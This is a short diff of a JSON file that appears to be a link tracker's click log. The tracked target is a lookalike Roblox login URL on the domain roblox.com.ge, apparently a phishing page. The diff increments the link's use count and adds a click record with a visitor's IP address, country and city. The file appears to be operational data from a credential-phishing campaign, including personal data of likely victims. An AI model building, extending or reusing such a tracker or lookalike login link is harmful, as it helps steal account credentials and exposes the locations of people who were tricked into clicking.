@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 886,
+    "useCount": 887,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7195,6 +7195,14 @@
       },
       {
         "timestamp": 1777193744380,
+        "ip": "2.79.115.90",
+        "country": "Kazakhstan",
+        "city": "Atyrau",
+        "flag": "🇰🇿",
+        "countryCode": "KZ"
+      },
+      {
+        "timestamp": 1777193758153,
         "ip": "2.79.115.90",
         "country": "Kazakhstan",
         "city": "Atyrau",
